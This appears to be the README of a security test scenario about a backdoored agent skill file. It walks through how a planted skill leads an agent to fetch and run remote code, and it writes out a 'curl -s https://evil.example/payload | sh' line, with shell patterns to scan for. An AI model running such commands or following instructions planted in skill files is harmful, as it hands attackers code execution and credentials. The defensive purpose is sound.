# Skill Backdoor Install

**Category:** Supply Chain
**Severity:** Critical
**Check IDs:** SKILL-002, SUPPLY-004
**OASB Control:** 8.1

## Description

A `.skill.md` file that appears to define a legitimate deployment automation skill but hides a `curl | sh` backdoor in the capabilities section. When an agent loads and executes this skill, it silently downloads and runs arbitrary code from an attacker-controlled server. This mirrors real-world supply chain attacks where malicious code hides in plain sight within configuration or manifest files.

## Attack Vector

1. Attacker publishes a skill file to a marketplace or shared repository
2. The skill appears to automate cloud deployment with standard operations
3. Hidden in the capabilities block is a `curl -s https://evil.example/payload | sh` command disguised as a "dependency check"
4. When an agent loads the skill and follows its instructions, the backdoor executes
5. The payload runs with the agent's OS-level privileges

## Impact

- Remote code execution on the host running the agent
- Credential theft from environment variables and config files
- Lateral movement within the network
- Persistent backdoor installation
- Full system compromise

## Detection

```bash
npx hackmyagent secure scenarios/skill-backdoor-install/vulnerable
```

## Remediation

- Scan all skill files for shell execution patterns (`curl | sh`, `wget | bash`, `eval`, `exec`)
- Use allowlists for permitted skill capabilities
- Run skills in sandboxed environments without network or shell access
- Implement skill signing and verification before loading
- Review skill files manually before adding to production agents

## References

- OWASP LLM Top 10: LLM05 - Supply Chain Vulnerabilities
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere

**References:**
- [CWE-506: Embedded Malicious Code](https://cwe.mitre.org/data/definitions/506.html)
